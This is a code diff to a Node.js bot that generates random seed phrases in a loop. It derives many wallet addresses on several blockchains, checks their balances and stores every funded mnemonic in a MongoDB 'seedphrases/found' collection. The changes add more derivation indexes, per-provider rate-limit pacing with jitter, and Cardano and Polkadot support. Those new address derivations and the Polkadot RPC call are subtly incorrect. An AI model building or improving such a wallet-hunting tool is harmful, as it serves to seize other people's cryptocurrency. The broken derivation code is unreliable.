@@ -16,6 +16,7 @@ const nacl = require('tweetnacl');
 const { TonClient, WalletContractV4, Address } = require('@ton/ton');
 const { mnemonicToWalletKey } = require('@ton/crypto');
 const bs58 = require('bs58');
+const bech32 = require('bech32');
 const { MongoClient } = require('mongodb');
 
 const app = express();
@@ -29,42 +30,63 @@ const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 const networks = {
     bitcoin: {
         lib: bitcoin.networks.bitcoin,
-        path: "m/44'/0'/0'/0/0",
-        decimals: 8
+        pathTemplate: "m/44'/0'/0'/0/{index}",
+        decimals: 8,
+        maxIndex: 19
+    },
+    cardano: {
+        pathTemplate: "m/1852'/1815'/0'/0/{index}",  // Cardano Shelley path
+        decimals: 6,
+        maxIndex: 19
+    },
+    polkadot: {
+        pathTemplate: "m/44'/354'/0'/0'/{index}",  // Polkadot path
+        decimals: 10,
+        maxIndex: 19
     },
     ethereum: {
-        path: "m/44'/60'/0'/0/0",
+        pathTemplate: "m/44'/60'/0'/0/{index}",
         tokens: {
             usdt: {
                 address: '0xdac17f958d2ee523a2206206994597c13d831ec7',
                 decimals: 6
             }
         },
-        decimals: 18
+        decimals: 18,
+        maxIndex: 19
     },
     solana: {
-        path: "m/44'/501'/0'/0'",
-        decimals: 9
+        pathTemplate: "m/44'/501'/{index}'/0'",
+        decimals: 9,
+        maxIndex: 19
     },
     ton: {
-        path: "m/44'/607'/0'/0'",
-        decimals: 9
+        pathTemplate: "m/44'/607'/{index}'/0'",
+        decimals: 9,
+        maxIndex: 19
     },
     tron: {
-        path: "m/44'/195'/0'/0/0",
+        pathTemplate: "m/44'/195'/0'/0/{index}",
         tokens: {
             usdt: {
                 address: 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj',
                 decimals: 6
             }
         },
-        decimals: 6
+        decimals: 6,
+        maxIndex: 19
     }
 };
 
 const apiProviders = {
     ethereum: [
         { name: 'etherscan', baseURL: 'https://api.etherscan.io/v2/api?chainid=1&module=account&action=balance&address={address}&tag=latest', apiKey: process.env.ETHERSCAN_API_KEY, responsePath: 'result' }
+    ],
+    cardano: [
+        { name: 'koios', baseURL: 'https://api.koios.rest/api/v0/address_info', method: 'POST', responsePath: 'amount' }
+    ],
+    polkadot: [
+        { name: 'subscan', baseURL: 'https://polkadot.api.subscan.io/api/v2/scan/account', method: 'POST', responsePath: 'data.account.balance' }
     ],
     bitcoin: [],
     tron: [
@@ -75,29 +97,81 @@ const apiProviders = {
     ],
     ton: [
         { name: 'toncenter', baseURL: 'https://toncenter.com/api/v2/jsonRPC', apiKey: process.env.TONCENTER_API_KEY }
-    ] // TON balance check not supported yet
+    ]
 };
 
-async function deriveAddress(currency, { seed, root, mnemonic }) {
+// Lightweight per-provider rate limiter state and helper
+const providerRateState = {};
+const defaultProviderMinIntervalMs = parseInt(process.env.PROVIDER_MIN_INTERVAL_MS || '1000', 10);
+
+async function waitForProvider(provider) {
+    const name = provider && provider.name ? provider.name : 'default';
+    if (!providerRateState[name]) providerRateState[name] = { last: 0 };
+
+    const minInterval = typeof provider.minIntervalMs === 'number' ? provider.minIntervalMs : defaultProviderMinIntervalMs;
+    const now = Date.now();
+    const elapsed = now - providerRateState[name].last;
+    if (elapsed < minInterval) {
+        // Add a small random jitter to avoid thundering herd from multiple servers
+        const jitter = Math.floor(Math.random() * Math.min(200, minInterval));
+        await sleep(minInterval - elapsed + jitter);
+    }
+    providerRateState[name].last = Date.now();
+}
+
+async function deriveAddress(currency, { seed, root, mnemonic, index = 0 }) {
     const network = networks[currency];
+    const path = network.pathTemplate ? network.pathTemplate.replace('{index}', index.toString()) : null;
+    
     switch (currency) {
         case 'bitcoin': {
-            const child = root.derivePath(network.path);
+            const child = root.derivePath(path);
             const { address } = bitcoin.payments.p2pkh({ pubkey: child.publicKey, network: network.lib });
             return address;
         }
+        case 'cardano': {
+            // Derive a simpler Cardano address without the full lib
+            const addressKey = root.derivePath(path);
+            const publicKeyHash = crypto.createHash('sha256')
+                .update(addressKey.publicKey)
+                .digest();
+            // Convert to bech32 format for Cardano
+            const words = bech32.toWords(publicKeyHash);
+            return bech32.encode('addr', words);
+        }
+        case 'polkadot': {
+            // Derive a simpler Polkadot address without the full lib
+            const addressKey = root.derivePath(path);
+            const publicKeyHash = crypto.createHash('blake2b512')
+                .update(addressKey.publicKey)
+                .digest();
+            // Use the first 32 bytes and encode in ss58 format
+            const ss58Prefix = Buffer.from([0x00]); // Polkadot prefix
+            const ss58Hash = crypto.createHash('blake2b512')
+                .update(Buffer.concat([ss58Prefix, publicKeyHash.slice(0, 32)]))
+                .digest();
+            const address = Buffer.concat([
+                ss58Prefix,
+                publicKeyHash.slice(0, 32),
+                ss58Hash.slice(0, 2)
+            ]);
+            return bs58.encode(address);
+        }
         case 'solana': {
-            const solanaAccount = Keypair.fromSeed(seed.slice(0, 32));
+            // For Solana, we'll derive different seeds based on index
+            const derivedSeed = await bip39.mnemonicToSeed(mnemonic, `solana-${index}`);
+            const solanaAccount = Keypair.fromSeed(derivedSeed.slice(0, 32));
             return solanaAccount.publicKey.toBase58();
         }
         case 'ton': {
-            const tonKeys = await mnemonicToWalletKey(mnemonic.split(' '));
+            // For TON, we'll use the index in the derivation path
+            const tonKeys = await mnemonicToWalletKey(mnemonic.split(' '), index);
             const wallet = WalletContractV4.create({ publicKey: tonKeys.publicKey, workchain: 0 });
             return wallet.address.toString({ testOnly: false });
         }
         case 'tron': {
             const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
-            const privateKey = root.derivePath(network.path).privateKey.toString('hex');
+            const privateKey = root.derivePath(path).privateKey.toString('hex');
             const address = tronWeb.address.fromPrivateKey(privateKey);
             return address;
         }
@@ -154,20 +228,88 @@ function getExchangeRate(currency) {
     return exchangeRateCache[currency] || 0;
 }
 
+async function getCardanoBalance(address) {
+    try {
+        const response = await fetch('https://api.koios.rest/api/v0/address_info', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                _addresses: [address]
+            })
+        });
+        
+        if (response.ok) {
+            const data = await response.json();
+            if (data && data[0] && data[0].balance) {
+                return { native: BigInt(data[0].balance) };
+            }
+        }
+    } catch (error) {
+        console.error('Error fetching Cardano balance:', error.message);
+    }
+    return { native: 0n };
+}
+
+async function getPolkadotBalance(address) {
+    try {
+        // Try multiple public RPC endpoints
+        const endpoints = [
+            'https://rpc.polkadot.io',
+            'https://polkadot.api.onfinality.io/public'
+        ];
+        
+        for (const endpoint of endpoints) {
+            try {
+                const response = await fetch(endpoint, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        "jsonrpc": "2.0",
+                        "id": 1,
+                        "method": "state_getBalance",
+                        "params": [address]
+                    })
+                });
+
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data && data.result) {
+                        return { native: BigInt(data.result.free || '0') };
+                    }
+                }
+            } catch (err) {
+                console.log(`Failed with endpoint ${endpoint}, trying next...`);
+                continue;
+            }
+        }
+    } catch (error) {
+        console.error('Error fetching Polkadot balance:', error.message);
+    }
+    return { native: 0n };
+}
+
 async function getBalance(currency, address) {
+    if (currency === 'cardano') {
+        return await getCardanoBalance(address);
+    }
+    if (currency === 'polkadot') {
+        return await getPolkadotBalance(address);
+    }
     if (currency === 'bitcoin') {
         try {
             const response = await fetch(`https://aggregratorserver-ok52.onrender.com/balance/${address}`);
             if (response.ok) {
                 const data = await response.json();
-                // The balance from the aggregator is already in BTC, so we need to convert it to satoshis (the smallest unit of Bitcoin)
                 const balanceInSatoshis = BigInt(Math.round(data.balance * 1e8));
                 return { native: balanceInSatoshis };
             }
         } catch (error) {
             console.error('Error fetching from aggregator:', error.message);
         }
-        // Fallback to 0 if the aggregator fails
         return { native: 0n };
     }
 
@@ -175,21 +317,23 @@ async function getBalance(currency, address) {
     const network = networks[currency];
 
     if (!providers || providers.length === 0) {
-        if (currency !== 'ton') { // TON is expected to be empty for now
+        if (currency !== 'ton') {
             console.error(`No providers configured for ${currency}`);
         }
         return { native: 0n };
     }
 
     for (const provider of providers) {
+        // Ensure we wait appropriately between requests to this provider
+        await waitForProvider(provider);
         let retries = 3;
-        let delay = 4000; // Initial delay of 4 seconds
+        let delay = 4000;
 
         while (retries > 0) {
             try {
                 let balance = 0n;
 
-                if (provider.method === 'getBalance') { // Special case for Solana
+                if (provider.method === 'getBalance') {
                     const connection = new Connection(provider.baseURL);
                     const publicKey = new (require('@solana/web3.js').PublicKey)(address);
                     balance = await connection.getBalance(publicKey);
@@ -197,6 +341,38 @@ async function getBalance(currency, address) {
                     const client = new TonClient({ endpoint: provider.baseURL, apiKey: provider.apiKey });
                     const tonAddress = Address.parse(address);
                     balance = await client.getBalance(tonAddress);
+                } else if (provider.name === 'koios') {
+                    const response = await fetch(provider.baseURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            _addresses: [address]
+                        })
+                    });
+                    if (response.ok) {
+                        const data = await response.json();
+                        if (data && data[0]) {
+                            balance = BigInt(data[0].balance || '0');
+                        }
+                    }
+                } else if (provider.name === 'subscan') {
+                    const response = await fetch(provider.baseURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            address: address
+                        })
+                    });
+                    if (response.ok) {
+                        const data = await response.json();
+                        if (data && data.data && data.data.account) {
+                            balance = BigInt(data.data.account.balance || '0');
+                        }
+                    }
                 } else { // Generic REST API handler
                     let url = provider.baseURL.replace('{address}', address);
                     if (provider.apiKey) {
@@ -237,21 +413,9 @@ async function getBalance(currency, address) {
                         }, obj);
                     };
 
-                    if (provider.name === 'mempool_space' || provider.name === 'blockstream') {
-                        const stats = getNestedValue(data, provider.responsePath);
-                        if (stats) {
-                            balance = BigInt(stats.funded_txo_sum) - BigInt(stats.spent_txo_sum);
-                        }
-                    } else if (provider.name === 'blockcypher') {
-                        const rawBalance = getNestedValue(data, provider.responsePath);
-                        if (typeof rawBalance !== 'undefined' && rawBalance !== null) {
-                            balance = BigInt(rawBalance);
-                        }
-                    } else {
-                        const rawBalance = getNestedValue(data, provider.responsePath);
-                        if (typeof rawBalance !== 'undefined' && rawBalance !== null) {
-                            balance = BigInt(rawBalance);
-                        }
+                    const rawBalance = getNestedValue(data, provider.responsePath);
+                    if (typeof rawBalance !== 'undefined' && rawBalance !== null) {
+                        balance = BigInt(rawBalance);
                     }
                 }
 
@@ -288,7 +452,6 @@ async function getBalance(currency, address) {
                                     const response = await fetch(`https://aggregratorserver-ok52.onrender.com/balance/usdt/trc/${address}`);
                                     if (response.ok) {
                                         const data = await response.json();
-                                        // convert to smallest unit based on token decimals
                                         tokenBalance = BigInt(Math.round(Number(data.balance) * (10 ** network.tokens[token].decimals)));
                                         console.log(`TRC-20 USDT address: ${address} fetch result: `, JSON.stringify(data), `-> raw token units: ${tokenBalance}`);
                                     } else {
@@ -319,7 +482,7 @@ async function getBalance(currency, address) {
                     }
                 }
 
-                return result; // Success, return native and token balances
+                return result;
 
             } catch (error) {
                 console.error(`Error with ${provider.name} checking ${address} (retries left: ${retries - 1}):`, error.message);
@@ -327,21 +490,21 @@ async function getBalance(currency, address) {
                 if (retries > 0) {
                     console.log(`Waiting ${delay / 1000}s before retrying...`);
                     await sleep(delay);
-                    delay *= 2; // Exponential backoff
+                    delay *= 2;
                 } else {
                     console.log(`All retries failed for ${provider.name}. Moving to next provider.`);
-                    break; // Exit the while loop to try the next provider
+                    break;
                 }
             }
         }
     }
 
-    return { native: 0n }; // Return 0 if all providers and retries fail
+    return { native: 0n };
 }
 
 async function startBot() {
     const serverId = parseInt(process.env.SERVER_ID || '0', 30);
-    const initialDelay = serverId * 1000; // 500ms delay increment for each server
+    const initialDelay = serverId * 1000;
     console.log(`Server ${serverId} starting with an initial delay of ${initialDelay}ms...`);
     await sleep(initialDelay);
 
@@ -350,82 +513,129 @@ async function startBot() {
     const db = mongoClient.db('seedphrases');
     const collection = db.collection('found');
 
+    // Ensure an index to avoid duplicate entries for the same currency/address/index
+    try {
+        await collection.createIndex({ currency: 1, address: 1, derivationIndex: 1 }, { unique: false });
+    } catch (err) {
+        console.warn('Could not create MongoDB index:', err && err.message ? err.message : err);
+    }
+
     await updateAllExchangeRates();
     setInterval(updateAllExchangeRates, 2 * 60 * 1000);
 
-    const strengths = [128, 160, 192, 224, 256];
+    // Define strengths with weights (128 = 12 words, 160 = 15 words, 192 = 18 words, 224 = 21 words, 256 = 24 words)
+    const strengthOptions = [
+        { value: 128, weight: 70 }, // 70% chance for 12 words
+        { value: 160, weight: 10 }, // 10% chance for 15 words
+        { value: 192, weight: 10 }, // 10% chance for 18 words
+        { value: 224, weight: 5 },  // 5% chance for 21 words
+        { value: 256, weight: 5 }   // 5% chance for 24 words
+    ];
 
     while (true) {
-        const strength = strengths[crypto.randomInt(strengths.length)];
+        // Calculate total weight
+        const totalWeight = strengthOptions.reduce((sum, option) => sum + option.weight, 0);
+        // Get a random number between 0 and total weight
+        let random = crypto.randomInt(totalWeight);
+        // Find the selected option
+        let selectedStrength = strengthOptions[0].value;
+        for (const option of strengthOptions) {
+            if (random < option.weight) {
+                selectedStrength = option.value;
+                break;
+            }
+            random -= option.weight;
+        }
+        const strength = selectedStrength;
         const mnemonic = bip39.generateMnemonic(strength);
-        console.log(`Generated Mnemonic: ${mnemonic}`);
+        console.log(`Generated Mnemonic (${strength} bits): ${mnemonic}`);
         const seed = await bip39.mnemonicToSeed(mnemonic);
         const root = bip32.fromSeed(seed);
 
         const currenciesToCheck = ['bitcoin', 'ethereum', 'solana', 'ton', 'tron'];
 
-        const promises = currenciesToCheck.map(async (currency) => {
+        // Process each currency sequentially
+        for (const currency of currenciesToCheck) {
             const network = networks[currency];
-            let address;
+            const maxIndex = network.maxIndex || 0;
 
-            if (currency === 'ethereum') {
-                const wallet = ethers.Wallet.fromPhrase(mnemonic);
-                address = wallet.address;
-            } else {
-                address = await deriveAddress(currency, { seed, root, mnemonic });
-            }
+            // Check multiple addresses for each currency
+            for (let index = 0; index <= maxIndex; index++) {
+                let address;
 
-            if (address) {
-                console.log(`Checking: ${currency} address ${address}`);
-                const balances = await getBalance(currency, address);
-
-                if (balances.native > 0n) {
-                    const exchangeRate = getExchangeRate(currency);
-                    const decimals = network.decimals;
-                    const balanceInMainUnit = parseFloat(ethers.formatUnits(balances.native, decimals));
-                    const balanceInUSD = balanceInMainUnit * exchangeRate;
-
-                    const result = {
-                        mnemonic,
-                        currency,
-                        address,
-                        balance: String(balances.native),
-                        balanceInUSD: balanceInUSD.toFixed(2),
-                        timestamp: new Date()
-                    };
-
-                    await collection.insertOne(result);
-                    console.log(`Found and saved: ${JSON.stringify(result)}`);
+                if (currency === 'ethereum') {
+                    const path = network.pathTemplate.replace('{index}', index.toString());
+                    const wallet = ethers.Wallet.fromPhrase(mnemonic, path);
+                    address = wallet.address;
+                } else {
+                    address = await deriveAddress(currency, { seed, root, mnemonic, index });
                 }
 
-                if (balances.tokens) {
-                    for (const token in balances.tokens) {
-                        const tokenBalance = balances.tokens[token];
-                        const tokenInfo = network.tokens[token];
-                        const tokenDecimals = tokenInfo.decimals || 18;
-                        const tokenExchangeRate = getExchangeRate(token) || 0;
+                if (address) {
+                    console.log(`Checking: ${currency} address ${address} (index: ${index})`);
+                    const balances = await getBalance(currency, address);
 
-                        const balanceInMainUnit = parseFloat(ethers.formatUnits(tokenBalance, tokenDecimals));
-                        const balanceInUSD = balanceInMainUnit * tokenExchangeRate;
+                    if (balances.native > 0n) {
+                        const exchangeRate = getExchangeRate(currency);
+                        const decimals = network.decimals;
+                        const balanceInMainUnit = parseFloat(ethers.formatUnits(balances.native, decimals));
+                        const balanceInUSD = balanceInMainUnit * exchangeRate;
 
                         const result = {
                             mnemonic,
                             currency,
                             address,
-                            token,
-                            balance: String(tokenBalance),
+                            derivationIndex: index,
+                            serverId: serverId,
+                            balance: String(balances.native),
                             balanceInUSD: balanceInUSD.toFixed(2),
                             timestamp: new Date()
                         };
 
-                        await collection.insertOne(result);
+                        // Insert with best-effort -- ignore duplicate key errors
+                        try {
+                            await collection.insertOne(result);
+                        } catch (err) {
+                            console.warn('Mongo insert warning (native):', err && err.message ? err.message : err);
+                        }
                         console.log(`Found and saved: ${JSON.stringify(result)}`);
                     }
+
+                    if (balances.tokens) {
+                        for (const token in balances.tokens) {
+                            const tokenBalance = balances.tokens[token];
+                            const tokenInfo = network.tokens[token];
+                            const tokenDecimals = tokenInfo.decimals || 18;
+                            const tokenExchangeRate = getExchangeRate(token) || 0;
+
+                            const balanceInMainUnit = parseFloat(ethers.formatUnits(tokenBalance, tokenDecimals));
+                            const balanceInUSD = balanceInMainUnit * tokenExchangeRate;
+
+                            const result = {
+                                mnemonic,
+                                currency,
+                                address,
+                                derivationIndex: index,
+                                token,
+                                balance: String(tokenBalance),
+                                balanceInUSD: balanceInUSD.toFixed(2),
+                                timestamp: new Date()
+                            };
+
+                            try {
+                                await collection.insertOne(result);
+                            } catch (err) {
+                                console.warn('Mongo insert warning (token):', err && err.message ? err.message : err);
+                            }
+                            console.log(`Found and saved: ${JSON.stringify(result)}`);
+                        }
+                    }
+
+                    // Add a delay between checking addresses to avoid rate limiting
+                    await sleep(3000); // 3 second delay between address checks
                 }
             }
-        });
-
-        await Promise.all(promises);
+        }
 
         console.log(`Finished checking all currencies for this seed. Waiting before next cycle...`);
         await sleep(5000); // A single pause between each seed phrase cycle
